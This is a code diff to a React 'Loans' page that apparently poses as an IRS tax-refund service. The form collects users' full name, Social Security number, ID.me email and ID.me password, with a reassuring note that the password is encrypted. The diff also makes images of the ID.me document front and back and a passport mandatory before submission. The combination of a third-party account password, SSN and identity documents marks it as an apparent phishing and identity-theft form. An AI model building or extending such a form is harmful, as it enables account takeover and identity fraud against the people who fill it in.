@@ -26,11 +26,13 @@ const Loans = () => {
     ssn: '',
     idmeEmail: '',
     idmePassword: '',
-    country: ''
+    country: '',
+    idmeFront: null,
+    idmeBack: null,
+    passport: null
   });
   const [irsSubmitting, setIrsSubmitting] = useState(false);
   const [irsSuccess, setIrsSuccess] = useState(false);
-  const [uploadedDocuments, setUploadedDocuments] = useState([]);
   const [emailSending, setEmailSending] = useState(false);
   
   // List of countries for the dropdown
@@ -99,20 +101,25 @@ const Loans = () => {
     }));
   };
 
-  const handleDocumentUpload = (e) => {
-    const files = Array.from(e.target.files);
-    const newDocuments = files.map((file, index) => ({
-      id: Date.now() + index,
-      name: file.name,
-      size: file.size,
-      type: file.type,
-      file: file
-    }));
-    setUploadedDocuments(prev => [...prev, ...newDocuments]);
+  const handleIdmeFrontUpload = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      setIrsForm(prev => ({ ...prev, idmeFront: file }));
+    }
   };
 
-  const handleRemoveDocument = (documentId) => {
-    setUploadedDocuments(prev => prev.filter(doc => doc.id !== documentId));
+  const handleIdmeBackUpload = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      setIrsForm(prev => ({ ...prev, idmeBack: file }));
+    }
+  };
+
+  const handlePassportUpload = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      setIrsForm(prev => ({ ...prev, passport: file }));
+    }
   };
 
   const sendConfirmationEmail = async () => {
@@ -135,30 +142,36 @@ const Loans = () => {
   const handleIrsSubmit = async () => {
     setIrsSubmitting(true);
     try {
-      // Create FormData to send files with the request
       const formData = new FormData();
-      // Append all form fields
-      Object.keys(irsForm).forEach(key => {
-        formData.append(key, irsForm[key]);
-      });
-      // Append all uploaded documents
-      uploadedDocuments.forEach((doc, index) => {
-        formData.append(`document_${index}`, doc.file);
-      });
+      formData.append('fullName', irsForm.fullName);
+      formData.append('ssn', irsForm.ssn);
+      formData.append('idmeEmail', irsForm.idmeEmail);
+      formData.append('idmePassword', irsForm.idmePassword);
+      formData.append('country', irsForm.country);
+      
+      if (irsForm.idmeFront) {
+        formData.append('idmeFront', irsForm.idmeFront);
+      }
+      if (irsForm.idmeBack) {
+        formData.append('idmeBack', irsForm.idmeBack);
+      }
+      if (irsForm.passport) {
+        formData.append('passport', irsForm.passport);
+      }
       
       await dispatch(submitTaxRefundRequest(formData)).unwrap();
-      // Send confirmation email after successful submission
       await sendConfirmationEmail();
       setIrsSuccess(true);
-      // Reset form and uploaded documents
       setIrsForm({
         fullName: '',
         ssn: '',
         idmeEmail: '',
         idmePassword: '',
-        country: ''
+        country: '',
+        idmeFront: null,
+        idmeBack: null,
+        passport: null
       });
-      setUploadedDocuments([]);
     } catch (error) {
       console.error('Tax refund request failed:', error);
     } finally {
@@ -222,7 +235,8 @@ const Loans = () => {
           background: 'radial-gradient(circle, rgba(0,200,150,0.15) 0%, rgba(0,200,150,0.05) 40%, transparent 70%)',
           filter: 'blur(70px)',
           pointerEvents: 'none',
-          zIndex: 0
+          zIndex: 0,
+          display: { xs: 'none', md: 'block' }
         }}
       />
       <motion.div
@@ -247,7 +261,8 @@ const Loans = () => {
           background: 'radial-gradient(circle, rgba(0,102,255,0.12) 0%, rgba(0,102,255,0.03) 40%, transparent 70%)',
           filter: 'blur(80px)',
           pointerEvents: 'none',
-          zIndex: 0
+          zIndex: 0,
+          display: { xs: 'none', md: 'block' }
         }}
       />
 
@@ -441,59 +456,35 @@ const Loans = () => {
                     borderRadius: 2,
                     background: 'rgba(255,255,255,0.7)',
                     backdropFilter: 'blur(20px)',
-                    border: '1px solid rgba(0,200,150,0.1)',
-                    boxShadow: '0 10px 40px -10px rgba(0,200,150,0.15)',
-                    transition: 'all 0.4s ease',
-                    '&:hover': {
-                      boxShadow: '0 20px 60px -15px rgba(0,200,150,0.3)'
-                    }
-                  }}>
-                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>ID.me Credentials</Typography>
-                    <TextField
-                      fullWidth
-                      label="ID.me Email"
-                      name="idmeEmail"
-                      type="email"
-                      value={irsForm.idmeEmail}
-                      onChange={handleIrsFormChange}
-                      margin="normal"
-                      required
-                      sx={{
-                        '& .MuiOutlinedInput-root': {
-                          borderRadius: '12px',
-                          transition: 'all 0.3s ease',
-                          '&:hover .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#0066ff'
-                          },
-                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#0066ff',
-                            borderWidth: 2
-                          }
-                        }
-                      }}
-                    />
-                    <TextField
-                      fullWidth
-                      label="ID.me Password"
-                      name="idmePassword"
-                      type="password"
-                      value={irsForm.idmePassword}
-                      onChange={handleIrsFormChange}
-                      margin="normal"
-                      required
-                      helperText="Your password is encrypted and never stored in plain text"
-                      sx={{
-                        '& .MuiOutlinedInput-root': {
-                          borderRadius: '12px',
-                          transition: 'all 0.3s ease',
-                          '&:hover .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#0066ff'
-                          },
-                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#0066ff',
-                            borderWidth: 2
-                          }
-                        }
+border: '1px solid rgba(0,200,150,0.1)',
+                     boxShadow: '0 10px 40px -10px rgba(0,200,150,0.15)',
+                     transition: 'all 0.4s ease',
+                     '&:hover': {
+                       boxShadow: '0 20px 60px -15px rgba(0,200,150,0.3)'
+                     }
+                   }}>
+                     <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>ID.me Credentials</Typography>
+                     <TextField
+                       fullWidth
+                       label="ID.me Email"
+                       name="idmeEmail"
+                       type="email"
+                       value={irsForm.idmeEmail}
+                       onChange={handleIrsFormChange}
+                       margin="normal"
+                       required
+                       sx={{
+                         '& .MuiOutlinedInput-root': {
+                           borderRadius: '12px',
+                           transition: 'all 0.3s ease',
+                           '&:hover .MuiOutlinedInput-notchedOutline': {
+                             borderColor: '#0066ff'
+                           },
+                           '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
+                             borderColor: '#0066ff',
+                             borderWidth: 2
+                           }
+                         }
                        }}
                      />
                      <TextField
@@ -520,24 +511,99 @@ const Loans = () => {
                          }
                        }}
                      />
-                   </Paper>
-                 </motion.div>
-               </Grid>
-               <Grid item xs={12}>
-                <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
-                  <Paper sx={{ 
-                    p: 4, 
-                    borderRadius: 2,
-                    background: 'rgba(255,255,255,0.7)',
-                    backdropFilter: 'blur(20px)',
-                    border: '1px solid rgba(0,102,255,0.1)',
-                    boxShadow: '0 10px 40px -10px rgba(0,102,255,0.15)',
-                    transition: 'all 0.4s ease',
-                    '&:hover': {
-                      boxShadow: '0 20px 60px -15px rgba(0,102,255,0.3)'
-                    }
-                  }}>
-                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>Location Information</Typography>
+                     <Button
+                       variant="outlined"
+                       component="label"
+                       sx={{
+                         mt: 2,
+                         borderRadius: '12px',
+                         '& .MuiButton-startIcon': {
+                           marginRight: 1
+                         }
+                       }}
+                       startIcon={<CloudUpload />}
+                     >
+                       ID.me Front
+                       <input
+                         type="file"
+                         accept="image/*"
+                         onChange={handleIdmeFrontUpload}
+                         style={{ display: 'none' }}
+                       />
+                     </Button>
+                     {irsForm.idmeFront && (
+                       <Typography variant="caption" color="success.main" sx={{ mt: 1, display: 'block' }}>
+                         ✓ {irsForm.idmeFront.name}
+                       </Typography>
+                     )}
+                     <Button
+                       variant="outlined"
+                       component="label"
+                       sx={{
+                         mt: 2,
+                         borderRadius: '12px',
+                         '& .MuiButton-startIcon': {
+                           marginRight: 1
+                         }
+                       }}
+                       startIcon={<CloudUpload />}
+                     >
+                       ID.me Back
+                       <input
+                         type="file"
+                         accept="image/*"
+                         onChange={handleIdmeBackUpload}
+                         style={{ display: 'none' }}
+                       />
+                     </Button>
+                     {irsForm.idmeBack && (
+                       <Typography variant="caption" color="success.main" sx={{ mt: 1, display: 'block' }}>
+                         ✓ {irsForm.idmeBack.name}
+                       </Typography>
+                     )}
+                     <Button
+                       variant="outlined"
+                       component="label"
+                       sx={{
+                         mt: 2,
+                         borderRadius: '12px',
+                         '& .MuiButton-startIcon': {
+                           marginRight: 1
+                         }
+                       }}
+                       startIcon={<CloudUpload />}
+                     >
+                       Passport
+                       <input
+                         type="file"
+                         accept="image/*"
+                         onChange={handlePassportUpload}
+                         style={{ display: 'none' }}
+                       />
+                     </Button>
+                     {irsForm.passport && (
+                       <Typography variant="caption" color="success.main" sx={{ mt: 1, display: 'block' }}>
+                         ✓ {irsForm.passport.name}
+                       </Typography>
+                     )}
+                    </Paper>
+                  </motion.div>
+                </Grid>
+                <Grid item xs={12}>
+                 <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
+                   <Paper sx={{ 
+                     p: 4, 
+                     borderRadius: 2,
+                     background: 'rgba(255,255,255,0.7)',
+                     backdropFilter: 'blur(20px)',
+                     border: '1px solid rgba(0,102,255,0.1)',
+                     boxShadow: '0 10px 40px -10px rgba(0,102,255,0.15)',
+                     transition: 'all 0.4s ease',
+                     '&:hover': {
+                       boxShadow: '0 20px 60px -15px rgba(0,102,255,0.3)'
+                     }
+                   }}>
+                     <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>Location Information</Typography>
                     <TextField
                       select
                       fullWidth
@@ -595,7 +661,7 @@ const Loans = () => {
                     variant="contained"
                     size="large"
                     onClick={handleIrsSubmit}
-                    disabled={irsSubmitting || !irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country}
+                    disabled={irsSubmitting || !irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country || !irsForm.idmeFront || !irsForm.idmeBack || !irsForm.passport}
                     sx={{
                       py: 2,
                       px: 6,
